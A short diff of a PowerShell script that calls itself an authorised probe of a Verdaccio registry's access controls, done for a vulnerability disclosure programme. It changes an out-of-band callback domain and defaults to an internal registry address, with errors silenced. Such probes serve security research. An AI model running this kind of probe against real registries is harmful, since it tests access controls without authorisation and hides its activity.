@@ -1,7 +1,7 @@
 # Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
 # Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
 $ErrorActionPreference = 'SilentlyContinue'
-$OAST = 'dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun'
+$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
 $R = $env:NPM_CONFIG_REGISTRY
 if (-not $R) { $R = 'http://10.64.0.28:4873' }
 $R = $R.TrimEnd('/')
